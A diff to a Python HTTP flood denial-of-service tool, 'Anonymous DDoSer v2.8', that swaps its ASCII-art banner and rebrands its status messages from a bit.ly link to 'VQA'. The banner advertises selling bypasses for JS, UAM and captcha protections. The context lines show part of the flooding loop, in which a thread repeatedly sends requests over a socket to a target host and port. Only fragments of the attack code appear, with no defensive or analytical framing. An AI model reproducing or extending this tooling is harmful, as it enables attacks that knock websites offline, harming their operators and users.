@@ -188,13 +188,16 @@ def logo():
     print('''
              - PassDDoS#6595 Selling Bypass JS/UAM/Captcha/etc -
 
-    /\_____/\     Vu Quang Anh Dep Trai Nhat The Gioi Trum Block F5
-   /  o   o  \    Vu Quang Anh Dep Trai Nhat The Gioi Trum Block F5
-  ( ==  ^  == )   Vu Quang Anh Dep Trai Nhat The Gioi Trum Block F5
-   )         (    Vu Quang Anh Dep Trai Nhat The Gioi Trum Block F5
-  (           )   ========================================================
- ( (  )   (  ) )     Anonymous DDoSer v2.8 - Best HTTP Flooder For FREE
-(__(__)___(__)__) ===== Version: [ Private ]''')
+    ██▒   █▓ █    ██      █████   █    ██  ▄▄▄       ███▄    █   ▄████     ▄▄▄       ███▄    █  ██░ ██ 
+▓██░   █▒ ██  ▓██▒   ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒   ▒████▄     ██ ▀█   █ ▓██░ ██▒
+ ▓██  █▒░▓██  ▒██░   ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░   ▒██  ▀█▄  ▓██  ▀█ ██▒▒██▀▀██░
+  ▒██ █░░▓▓█  ░██░   ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓   ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█ ░██ 
+   ▒▀█░  ▒▒█████▓    ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒    ▓█   ▓██▒▒██░   ▓██░░▓█▒░██▓
+   ░ ▐░  ░▒▓▒ ▒ ▒    ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒     ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒ ░░▒░▒
+   ░ ░░  ░░▒░ ░ ░     ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░      ▒   ▒▒ ░░ ░░   ░ ▒░ ▒ ░▒░ ░
+     ░░   ░░░ ░ ░       ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░ ░ ░   ░      ░   ▒      ░   ░ ░  ░  ░░ ░
+      ░     ░            ░       ░           ░  ░         ░       ░          ░  ░         ░  ░  ░  ░
+     ░                                                                                              
     try:
         print("\n[*] Target : " +str(url_main)+ ":" +str(port))
     except:
@@ -725,9 +728,9 @@ class Home(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
-                print("[+] bit.ly/AnonyV28 | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
+                print("[+] VQA | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 #req_code += 1
-                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                #sys.stdout.write("[!] VQA | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
                 try:
                     for y in range(multiple):
